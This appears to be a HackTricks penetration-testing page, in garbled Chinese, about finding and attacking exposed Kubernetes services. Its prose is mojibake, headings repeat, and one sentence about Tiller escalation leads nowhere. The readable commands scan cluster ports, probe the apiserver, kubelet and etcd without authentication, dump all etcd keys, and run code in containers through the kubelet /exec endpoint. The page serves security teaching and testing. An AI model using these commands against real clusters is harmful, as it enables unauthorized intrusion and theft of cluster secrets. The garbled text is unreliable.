# æ¸—é€æµ‹è¯• Kubernetes æœåŠ¡

{% hint style="success" %}
å­¦ä¹ å¹¶ç»ƒä¹  AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å¹¶ç»ƒä¹  GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

Kubernetes ä½¿ç”¨å¤šä¸ª**ç‰¹å®šçš„ç½‘ç»œæœåŠ¡**ï¼Œæ‚¨å¯èƒ½ä¼šå‘ç°è¿™äº›æœåŠ¡**æš´éœ²åœ¨äº’è”ç½‘ä¸Š**æˆ–åœ¨**ä¸€æ—¦æ‚¨å·²ç»å…¥ä¾µäº†ä¸€ä¸ª pod åæš´éœ²åœ¨å†…éƒ¨ç½‘ç»œä¸­**ã€‚

## ä½¿ç”¨ OSINT æŸ¥æ‰¾æš´éœ²çš„ pods

ä¸€ç§æ–¹æ³•æ˜¯åœ¨ [crt.sh](https://crt.sh) ä¸­æœç´¢ `Identity LIKE "k8s.%.com"`ï¼Œä»¥æŸ¥æ‰¾ä¸ Kubernetes ç›¸å…³çš„å­åŸŸã€‚å¦ä¸€ç§æ–¹æ³•å¯èƒ½æ˜¯åœ¨ github ä¸­æœç´¢ `"k8s.%.com"` å¹¶æœç´¢åŒ…å«è¯¥å­—ç¬¦ä¸²çš„ **YAML æ–‡ä»¶**ã€‚

## Kubernetes å¦‚ä½•æš´éœ²æœåŠ¡

äº†è§£ Kubernetes å¦‚ä½•**å…¬å¼€æš´éœ²æœåŠ¡**å¯èƒ½å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©ï¼Œä»¥ä¾¿æ‰¾åˆ°å®ƒä»¬ï¼š

{% content-ref url="exposing-services-in-kubernetes.md" %}
[exposing-services-in-kubernetes.md](exposing-services-in-kubernetes.md)
{% endcontent-ref %}

## é€šè¿‡ç«¯å£æ‰«ææŸ¥æ‰¾æš´éœ²çš„ pods

åœ¨ Kubernetes é›†ç¾¤ä¸­å¯èƒ½ä¼šæ‰“å¼€ä»¥ä¸‹ç«¯å£ï¼š

| ç«¯å£            | è¿›ç¨‹           | æè¿°                                                                   |
| --------------- | -------------- | ---------------------------------------------------------------------- |
| 443/TCP         | kube-apiserver | Kubernetes API ç«¯å£                                                    |
| 2379/TCP        | etcd           |                                                                        |
| 6666/TCP        | etcd           | etcd                                                                   |
| 4194/TCP        | cAdvisor       | å®¹å™¨æŒ‡æ ‡                                                              |
| 6443/TCP        | kube-apiserver | Kubernetes API ç«¯å£                                                    |
| 8443/TCP        | kube-apiserver | Minikube API ç«¯å£                                                     |
| 8080/TCP        | kube-apiserver | ä¸å®‰å…¨çš„ API ç«¯å£                                                     |
| 10250/TCP       | kubelet        | å…è®¸å®Œå…¨è®¿é—®çš„ HTTPS API                                              |
| 10255/TCP       | kubelet        | æ— éœ€èº«ä»½éªŒè¯çš„åªè¯» HTTP ç«¯å£ï¼špodsã€è¿è¡Œä¸­çš„ pods å’ŒèŠ‚ç‚¹çŠ¶æ€         |
| 10256/TCP       | kube-proxy     | Kube Proxy å¥åº·æ£€æŸ¥æœåŠ¡å™¨                                             |
| 9099/TCP        | calico-felix   | Calico çš„å¥åº·æ£€æŸ¥æœåŠ¡å™¨                                               |
| 6782-4/TCP      | weave          | æŒ‡æ ‡å’Œç«¯ç‚¹                                                            |
| 30000-32767/TCP | NodePort       | æœåŠ¡çš„ä»£ç†                                                            |
| 44134/TCP       | Tiller         | Helm æœåŠ¡ç›‘å¬                                                          |

### Nmap

{% code overflow="wrap" %}
```bash
nmap -n -T4 -p 443,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 <pod_ipaddress>/16
```
{% endcode %}

### Kube-apiserver

è¿™æ˜¯ç®¡ç†å‘˜é€šå¸¸ä½¿ç”¨å·¥å…·`kubectl`ä¸ä¹‹äº¤äº’çš„**API KubernetesæœåŠ¡**ã€‚

**å¸¸è§ç«¯å£ï¼š6443å’Œ443**ï¼Œä½†åœ¨minikubeä¸­ä¹Ÿæœ‰8443ç«¯å£ï¼Œä»¥åŠ8080ç«¯å£ä½œä¸ºä¸å®‰å…¨ç«¯å£ã€‚
```
curl -k https://<IP Address>:(8|6)443/swaggerapi
curl -k https://<IP Address>:(8|6)443/healthz
curl -k https://<IP Address>:(8|6)443/api/v1
```
**æŸ¥çœ‹ä»¥ä¸‹é¡µé¢ä»¥äº†è§£å¦‚ä½•è·å–æ•æ„Ÿæ•°æ®å¹¶ä¸æ­¤æœåŠ¡äº¤äº’æ‰§è¡Œæ•æ„Ÿæ“ä½œ:**

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

### Kubelet API

æ­¤æœåŠ¡**åœ¨é›†ç¾¤çš„æ¯ä¸ªèŠ‚ç‚¹ä¸Šè¿è¡Œ**ã€‚è¿™æ˜¯æ§åˆ¶**èŠ‚ç‚¹**å†…çš„podçš„æœåŠ¡ã€‚å®ƒä¸**kube-apiserver**é€šä¿¡ã€‚

å¦‚æœæ‚¨å‘ç°æ­¤æœåŠ¡æš´éœ²ï¼Œå¯èƒ½å·²æ‰¾åˆ°ä¸€ä¸ª**æœªç»èº«ä»½éªŒè¯çš„RCE**ã€‚
```
curl -k https://<IP address>:10250/metrics
curl -k https://<IP address>:10250/pods
```
å¦‚æœå“åº”æ˜¯ `Unauthorized`ï¼Œåˆ™éœ€è¦è¿›è¡Œèº«ä»½éªŒè¯ã€‚

å¦‚æœæ‚¨å¯ä»¥åˆ—å‡ºèŠ‚ç‚¹ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è·å– kubelet ç«¯ç‚¹åˆ—è¡¨ï¼š
```bash
kubectl get nodes -o custom-columns='IP:.status.addresses[0].address,KUBELET_PORT:.status.daemonEndpoints.kubeletEndpoint.Port' | grep -v KUBELET_PORT | while IFS='' read -r node; do
ip=$(echo $node | awk '{print $1}')
port=$(echo $node | awk '{print $2}')
echo "curl -k --max-time 30 https://$ip:$port/pods"
echo "curl -k --max-time 30 https://$ip:2379/version" #Check  also for etcd
done
```
#### kubeletï¼ˆåªè¯»ï¼‰
```
curl -k https://<IP Address>:10255
http://<external-IP>:10255/pods
```
### etcd API

### etcd API
```
curl -k https://<IP address>:2379
curl -k https://<IP address>:2379/version
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```
### Tiller

### Tiller
```
helm --host tiller-deploy.kube-system:44134 version
```
ä½ å¯ä»¥æ»¥ç”¨è¿™é¡¹æœåŠ¡æ¥åœ¨ Kubernetes å†…éƒ¨æå‡æƒé™ï¼š

### cAdvisor

ç”¨äºæ”¶é›†æŒ‡æ ‡çš„æœ‰ç”¨æœåŠ¡ã€‚
```
curl -k https://<IP Address>:4194
```
### NodePort

å½“é€šè¿‡**NodePort**åœ¨æ‰€æœ‰èŠ‚ç‚¹ä¸Šå…¬å¼€ç«¯å£æ—¶ï¼Œç›¸åŒçš„ç«¯å£å°†åœ¨æ‰€æœ‰èŠ‚ç‚¹ä¸Šæ‰“å¼€ï¼Œå°†æµé‡ä»£ç†åˆ°å£°æ˜çš„**Service**ä¸­ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ­¤ç«¯å£å°†ä½äº**30000-32767èŒƒå›´å†…**ã€‚å› æ­¤ï¼Œæ–°çš„æœªç»æ£€æŸ¥çš„æœåŠ¡å¯èƒ½å¯ä»¥é€šè¿‡è¿™äº›ç«¯å£è®¿é—®ã€‚
```
sudo nmap -sS -p 30000-32767 <IP>
```
## å¯èƒ½å­˜åœ¨çš„é…ç½®é”™è¯¯

### Kube-apiserver åŒ¿åè®¿é—®

**kube-apiserver API ç«¯ç‚¹ä¸å…è®¸åŒ¿åè®¿é—®**ã€‚ä½†æ‚¨å¯ä»¥æ£€æŸ¥ä¸€äº›ç«¯ç‚¹ï¼š

![](https://www.cyberark.com/wp-content/uploads/2019/09/Kube-Pen-2-fig-5.png)

### **æ£€æŸ¥ ETCD çš„åŒ¿åè®¿é—®**

ETCD å­˜å‚¨é›†ç¾¤æœºå¯†ã€é…ç½®æ–‡ä»¶å’Œæ›´å¤š**æ•æ„Ÿæ•°æ®**ã€‚**é»˜è®¤æƒ…å†µä¸‹**ï¼ŒETCD **ä¸å…è®¸**åŒ¿åè®¿é—®ï¼Œä½†æ£€æŸ¥ä¸€ä¸‹æ€»æ˜¯å¥½çš„ã€‚

å¦‚æœå¯ä»¥åŒ¿åè®¿é—® ETCDï¼Œæ‚¨å¯èƒ½éœ€è¦**ä½¿ç”¨** [**etcdctl**](https://github.com/etcd-io/etcd/blob/master/etcdctl/READMEv2.md) **å·¥å…·**ã€‚ä»¥ä¸‹å‘½ä»¤å°†è·å–æ‰€æœ‰å­˜å‚¨çš„å¯†é’¥ï¼š
```
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```
### **Kubelet RCE**

[Kubeletæ–‡æ¡£](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/)è§£é‡Šè¯´ï¼Œé»˜è®¤æƒ…å†µä¸‹å…è®¸å¯¹æœåŠ¡è¿›è¡ŒåŒ¿åè®¿é—®ï¼š

> å¯ç”¨å¯¹KubeletæœåŠ¡å™¨çš„åŒ¿åè¯·æ±‚ã€‚æœªè¢«å…¶ä»–èº«ä»½éªŒè¯æ–¹æ³•æ‹’ç»çš„è¯·æ±‚å°†è¢«è§†ä¸ºåŒ¿åè¯·æ±‚ã€‚åŒ¿åè¯·æ±‚çš„ç”¨æˆ·åä¸º`system:anonymous`ï¼Œç»„åä¸º`system:unauthenticated`ã€‚

è¦æ›´å¥½åœ°äº†è§£**Kubelet APIçš„èº«ä»½éªŒè¯å’Œæˆæƒ**å¦‚ä½•å·¥ä½œï¼Œè¯·æŸ¥çœ‹æ­¤é¡µé¢ï¼š

{% content-ref url="../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

**Kubelet**æœåŠ¡çš„**APIæœªè®°å½•**ï¼Œä½†å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°æºä»£ç ï¼Œå¹¶æŸ¥æ‰¾æš´éœ²çš„ç«¯ç‚¹å°±åƒ**è¿è¡Œ**ä¸€æ ·ç®€å•ï¼š
```bash
curl -s https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/server/server.go | grep 'Path("/'

Path("/pods").
Path("/run")
Path("/exec")
Path("/attach")
Path("/portForward")
Path("/containerLogs")
Path("/runningpods/").
```
ä½ å¯ä»¥ä½¿ç”¨[Kubeletctl](https://github.com/cyberark/kubeletctl)å·¥å…·ä¸KubeletsåŠå…¶ç«¯ç‚¹è¿›è¡Œäº¤äº’ã€‚

#### /pods

æ­¤ç«¯ç‚¹åˆ—å‡ºäº†PodsåŠå…¶å®¹å™¨ï¼š
```bash
kubeletctl pods
```
#### /exec

æ­¤ç«¯ç‚¹å…è®¸éå¸¸å®¹æ˜“åœ°åœ¨ä»»ä½•å®¹å™¨å†…æ‰§è¡Œä»£ç ï¼š
```bash
kubeletctl exec [command]
```
{% hint style="info" %}
ä¸ºé¿å…æ­¤æ”»å‡»ï¼Œ_**kubelet**_ æœåŠ¡åº”è¯¥ä»¥ `--anonymous-auth false` å‚æ•°è¿è¡Œï¼Œå¹¶ä¸”è¯¥æœåŠ¡åº”è¯¥åœ¨ç½‘ç»œå±‚é¢è¿›è¡Œéš”ç¦»ã€‚
{% endhint %}

### **æ£€æŸ¥ Kubeletï¼ˆåªè¯»ç«¯å£ï¼‰ä¿¡æ¯æ³„éœ²**

å½“**kubelet åªè¯»ç«¯å£**æš´éœ²æ—¶ï¼Œæœªç»æˆæƒçš„ç”¨æˆ·å¯èƒ½é€šè¿‡ API æ£€ç´¢ä¿¡æ¯ã€‚è¯¥ç«¯å£çš„æš´éœ²å¯èƒ½å¯¼è‡´å„ç§**é›†ç¾¤é…ç½®å…ƒç´ **çš„æ³„éœ²ã€‚å°½ç®¡ä¿¡æ¯ï¼ŒåŒ…æ‹¬**pod åç§°ã€å†…éƒ¨æ–‡ä»¶ä½ç½®å’Œå…¶ä»–é…ç½®**ï¼Œå¯èƒ½å¹¶ä¸å…³é”®ï¼Œä½†å…¶æš´éœ²ä»æ„æˆå®‰å…¨é£é™©ï¼Œåº”è¯¥é¿å…ã€‚

ä¸€ä¸ªåˆ©ç”¨è¿™ç§æ¼æ´çš„ç¤ºä¾‹æ¶‰åŠè¿œç¨‹æ”»å‡»è€…è®¿é—®ç‰¹å®š URLã€‚é€šè¿‡è®¿é—® `http://<external-IP>:10255/pods`ï¼Œæ”»å‡»è€…å¯èƒ½ä» kubelet ä¸­æ£€ç´¢åˆ°æ•æ„Ÿä¿¡æ¯ï¼š

![https://www.cyberark.com/wp-content/uploads/2019/09/KUbe-Pen-2-fig-6.png](https://www.cyberark.com/wp-content/uploads/2019/09/KUbe-Pen-2-fig-6.png)

## å‚è€ƒèµ„æ–™

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2" %}

{% embed url="https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet" %}

{% hint style="success" %}
å­¦ä¹ å¹¶ç»ƒä¹  AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å¹¶ç»ƒä¹  GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
